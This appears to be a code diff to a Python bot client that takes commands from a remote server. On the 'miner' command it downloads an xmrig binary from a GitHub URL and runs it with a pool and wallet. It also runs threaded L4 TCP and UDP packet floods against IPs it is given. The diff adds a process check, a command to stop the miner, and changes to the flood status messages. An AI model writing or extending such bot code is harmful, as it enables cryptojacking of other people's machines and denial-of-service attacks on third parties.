@@ -17,9 +17,31 @@ if cpu >= 2:
 else:
     thread = 1
 
+if sys.platform == "linux":
+    url = "https://github.com/rxyzqc/SC/raw/main/xmrig"
+    ext = "./"
+    rig = "xmrig"
+else:
+    url = "https://github.com/rxyzqc/SC/raw/main/xmrig.exe"
+    ext = ""
+    rig = "xmrig.exe"
+
+
+def task_exists(name):
+    if sys.platform == "linux":
+        for proc in os.popen("ps eux"):
+            if name.lower() in proc.lower():
+                return True
+        return False
+    else:
+        for proc in os.popen("tasklist"):
+            if name.lower() in proc.lower():
+                return True
+        return False
+
 
 def client():
-    global l4_tcp_flag, l4_udp_flag
+    global l4_tcp_flag, l4_udp_flag, rig
 
     try:
         c = socket.socket()
@@ -31,6 +53,13 @@ def client():
             if data == "ping":
                 c.sendall(b'pong')
 
+            elif data == "miner stop":
+                if task_exists(rig):
+                    if sys.platform == "linux":
+                        os.popen(f"pkill -f {rig}")
+                    else:
+                        os.popen(f"taskkill /F /IM {rig}")
+
             elif data.startswith("miner"):
                 data = data.split()
 
@@ -40,15 +69,6 @@ def client():
 
                 data = " ".join(data)
 
-                if sys.platform == "linux":
-                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig"
-                    ext = "./"
-                    rig = "xmrig"
-                else:
-                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig.exe"
-                    ext = ""
-                    rig = "xmrig.exe"
-
                 if not os.path.exists(rig):
                     response = requests.get(url)
 
@@ -56,7 +76,8 @@ def client():
                         f.write(response.content)
 
                 if os.path.exists(rig):
-                    os.popen(f"{ext}{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")
+                    if not task_exists(rig):
+                        os.popen(f"{ext}{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")
 
             # L4 TCP
             elif data == "l4 tcp stop":
@@ -81,10 +102,10 @@ def client():
                             l4_tcp_sock.connect((l4_tcp_ip, l4_tcp_port))
                             l4_tcp_sock.send(l4_tcp_bytes)
 
-                            print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {l4_tcp_ip}:{l4_tcp_port}")
+                            print(f"\033[32m[+]\033[0m L4 TCP Packet sent \033[31m->\033[0m {l4_tcp_ip}:{l4_tcp_port}")
 
-                        except Exception as err:
-                            print("\033[31m[-]\033[0m", err)
+                        except Exception:
+                            print("\033[31m[-]\033[0m L4 TCP Connection down!")
 
                 def l4_tcp_bg():
                     for i in range(thread):
@@ -119,12 +140,12 @@ def client():
                             l4_udp_socket.sendto(l4_udp_bytes, l4_udp_address)
 
                             if l4_udp_port == 0:
-                                print("\033[32m[+]\033[0m L4 UDP Packet sent ->", l4_udp_ip)
+                                print("\033[32m[+]\033[0m L4 UDP Packet sent \033[31m->\033[0m", l4_udp_ip)
                             else:
-                                print(f"\033[32m[+]\033[0m L4 UDP Packet sent -> {l4_udp_ip}:{l4_udp_port}")
+                                print(f"\033[32m[+]\033[0m L4 UDP Packet sent \033[31m->\033[0m {l4_udp_ip}:{l4_udp_port}")
 
-                        except Exception as err:
-                            print("\033[31m[-]\033[0m", err)
+                        except Exception:
+                            print("\033[31m[-]\033[0m L4 UDP Connection down!")
 
                 def l4_udp_bg():
                     for i in range(thread):
